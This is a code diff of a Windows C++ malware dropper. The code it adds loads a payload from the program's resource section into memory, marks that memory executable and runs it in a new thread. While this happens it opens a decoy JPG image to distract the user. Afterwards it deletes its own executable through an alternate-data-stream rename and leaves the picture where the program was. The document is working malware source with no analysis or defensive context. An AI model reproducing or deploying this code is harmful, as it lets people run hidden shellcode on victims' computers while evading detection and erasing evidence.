@@ -7,14 +7,14 @@
 #include "resource1.h"
 #include "pch.h"
 #include <shlwapi.h>
-//#include "calls.h"
+#include "calls.h"
 #include "olectl.h"
 #include <istream>
 #include <Gdiplus.h>
 #include "gdiplusgraphics.h"
 #include <filesystem>
 #include "namedpipeapi.h"
-#define DS_STREAM_RENAME L":wtfbbq"
+#define DS_STREAM_RENAME L":wtf"
 #define DS_DEBUG_LOG(msg) wprintf(L"[LOG] - %s\n", msg)
 
 
@@ -118,7 +118,10 @@ ds_rename_handle(
 	//wchar_t* name = (wchar_t* ) L":wtfbbq";
 	//LPWSTR lpwStream = name;
 	fRename.FileNameLength = sizeof(lpwStream);
+
 	RtlCopyMemory(fRename.FileName, lpwStream, sizeof(lpwStream));
+
+	//fRename.FileName = lpwStream;
 
 	return SetFileInformationByHandle(hHandle, FileRenameInfo, &fRename, sizeof(fRename) + sizeof(lpwStream));
 }
@@ -168,7 +171,7 @@ int writeFileToDisk(LPCWSTR lpTempFileName, unsigned char* payload, unsigned int
 }
 
 
-int deleteSelf(unsigned char* payload, unsigned int payload_len) {
+int deleteSelf(LPCWSTR filename, unsigned char* payload, unsigned int payload_len) {
 
 
 
@@ -234,8 +237,11 @@ int deleteSelf(unsigned char* payload, unsigned int payload_len) {
 		}
 
 		DS_DEBUG_LOG(L"successfully deleted self from disk");
+		PathRemoveFileSpec(wcPath);
+		std::wstring d1 = (LPWSTR)(wcPath);
+		std::wstring dest = d1 + L"\\" + filename;
 
-		writeFileToDisk((LPCWSTR)wcPath, payload, payload_len);
+		writeFileToDisk((LPCWSTR)dest.c_str(), payload, payload_len);
 		return 1;
 	
 
@@ -323,19 +329,48 @@ int windows_system(wchar_t* cmd)
 //
 //}
 
+
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, int nCmdShow) {
 
-	void* exec_mem;
-	
-	BOOL rv;
-	HANDLE th;
-	DWORD oldprotect = 0;
-	HGLOBAL resHandle = NULL;
-	HRSRC res;
-	
-	//char* payload;
-	//unsigned int payload_len;
+
+		void* exec_mem;
+		BOOL rv;
+		HANDLE th;
+		DWORD oldprotect = 0;
+		HGLOBAL resHandle = NULL;
+		HRSRC res;
+
+		unsigned char* payload1;
+		unsigned int payload1_len;
+
+		// Extract payload from resources section
+		res = FindResource(NULL, MAKEINTRESOURCE(105), L"BIN");
+		resHandle = LoadResource(NULL, res);
+		payload1 = (unsigned char*)LockResource(resHandle);
+		payload1_len = SizeofResource(NULL, res);
+
+		// Allocate some memory buffer for payload
+		exec_mem = VirtualAlloc(0, payload1_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+
+		// Copy payload to new memory buffer
+		RtlMoveMemory(exec_mem, payload1, payload1_len);
+
+		// Make the buffer executable
+		rv = VirtualProtect(exec_mem, payload1_len, PAGE_EXECUTE_READ, &oldprotect);
+
+
+		// Launch the payload
+		if (rv != 0) {
+			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+			WaitForSingleObject(th, -1);
+		}
+
+		//return 0;
+
+
 
 	unsigned char* payload;
 	unsigned int payload_len;
@@ -343,7 +378,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	HMODULE hModule = GetModuleHandle(NULL); // get the handle to the current module (the executable file)
 	HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(101), L"JPG"); // substitute RESOURCE_ID and RESOURCE_TYPE.
 	//HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(104), L"PNG"); // substitute RESOURCE_ID and RESOURCE_TYPE.
-
 	HGLOBAL hMemory = LoadResource(hModule, hResource);
 	payload = (unsigned char*)LockResource(hMemory);
 
@@ -353,20 +387,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	wchar_t szTempFileName[MAX_PATH];
 	DWORD retpath = GetTempPath(MAX_PATH, lpTempPathBuffer);
 	
-	if ( ! GetTempFileName(lpTempPathBuffer, // directory for tmp files
-		TEXT("DEMO"),     // temp file name prefix 
-		0,                // create unique name 
-		szTempFileName))  // buffer for name 
-	{
-		//PrintError(TEXT("GetTempFileName failed"));
-		return 1;
+	std::wstring picturename = L"hardcodepicturename.jpg";
 
-	}
-	HANDLE hFile = INVALID_HANDLE_VALUE;
-	//std::string = retpath
-
-	std::wstring d1 = (LPWSTR)(szTempFileName);
-	std::wstring dest = d1 + L".jpg";
+	std::wstring d1 = (LPWSTR)(lpTempPathBuffer);
+	std::wstring dest = d1 + picturename;
 	////LPTSTR d2 = LPTSTR(dest.c_str());
 	LPCWSTR lpTempFileName = (LPCWSTR)dest.c_str();
 
@@ -379,11 +403,25 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	//windows_system(comm);
 
 
-//	ShellExecute(NULL, L"open", comm, NULL, NULL, SW_SHOW);
+	//ShellExecute(NULL, L"open", comm, NULL, NULL, SW_SHOW);
 
+	SHELLEXECUTEINFO ShExecInfo = { 0 };
+	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+	ShExecInfo.hwnd = NULL;
+	ShExecInfo.lpVerb = NULL;
+	ShExecInfo.lpFile = comm;
+	ShExecInfo.lpParameters = L"";
+	ShExecInfo.lpDirectory = NULL;
+	ShExecInfo.nShow = SW_SHOW;
+	ShExecInfo.hInstApp = NULL;
+	ShellExecuteEx(&ShExecInfo);
+	WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
+	CloseHandle(ShExecInfo.hProcess);
+
+
+	deleteSelf((LPCWSTR)picturename.c_str(), payload, payload_len);
 	DeleteFile(lpTempFileName);
-
-	deleteSelf(payload, payload_len);
 
 	//STARTUPINFO si;
 	//PROCESS_INFORMATION pi;
@@ -408,25 +446,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	
 
 	return 0;
-	// Allocate some memory buffer for payload
-	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	//printf("%-20s : 0x%-016p\n", "payload addr", (void*)payload);
-	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);
 
-	// Copy payload to new memory buffer
-	RtlMoveMemory(exec_mem, payload, payload_len);
 
-	// Make the buffer executable
-	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
-
-	//printf("\nHit me!\n");
-	//getchar();
-
-	// Launch the payload
-	if (rv != 0) {
-		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
-		WaitForSingleObject(th, -1);
-	}
-
-	return 0;
 }
